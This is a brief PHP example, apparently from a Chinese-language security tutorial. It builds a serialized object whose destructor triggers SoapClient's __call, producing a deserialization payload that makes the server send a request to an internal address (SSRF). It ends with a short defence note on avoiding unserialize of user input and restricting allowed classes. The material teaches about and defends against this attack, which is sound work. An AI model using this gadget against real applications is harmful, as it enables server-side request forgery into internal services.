<?php
class A {
    public $obj;
    public function __destruct() {
        $this->obj->send();  // 触发SoapClient的__call
    }
}

$client = new SoapClient(null, [
    'location' => 'http://127.0.0.1:8080/internal',
    'uri' => 'http://test/',
    'user_agent' => 'SSRF'
]);

$a = new A();
$a->obj = $client;

$payload = serialize($a);
echo $payload;
?>


防御：避免反序列化用户输入，对SoapClient类进行白名单限制，或使用`allowed_classes`排除SoapClient。

